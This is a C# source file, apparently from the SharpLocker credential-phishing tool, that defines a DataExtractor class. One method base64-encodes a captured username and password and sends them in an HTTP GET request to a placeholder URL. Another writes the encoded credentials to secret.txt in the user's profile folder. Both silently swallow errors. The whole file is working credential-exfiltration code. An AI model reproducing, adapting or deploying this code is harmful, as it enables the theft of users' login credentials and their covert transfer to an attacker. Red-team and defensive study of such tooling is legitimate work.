using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using SharpLocker.Models;
using System.IO;

namespace SharpLocker.Services
{
    public static class DataExtractor
    {
        public static void ExtractGetRequest(User user)
        {
            string url = "http://127.0.0.1/xxxx";
            bool EncodeWithBase64 = true;
            string payload = user.UserName + ":" + user.Password;

            if (EncodeWithBase64)
            {
                var plainTextBytes = Encoding.UTF8.GetBytes(payload);
                payload = Convert.ToBase64String(plainTextBytes);
            }
            url = url + "?" + payload;

            try
            {
                HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
                req.GetResponse();
            }
            catch
            {
                // do nothing               
            }
        }

        public static void ExtractFile(User user)
        {
            string filename = "secret.txt";
            string path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            bool EncodeWithBase64 = true;
            string payload = user.UserName + ":" + user.Password;

            if (EncodeWithBase64)
            {
                var plainTextBytes = Encoding.UTF8.GetBytes(payload);
                payload = Convert.ToBase64String(plainTextBytes);
            }

            try
            {
                StreamWriter streamWriter = new StreamWriter($"{path}\\{filename}");
                streamWriter.WriteLine(payload);
                streamWriter.Close();
            }
            catch
            {
                // do nothing
            }

        }

    }
}
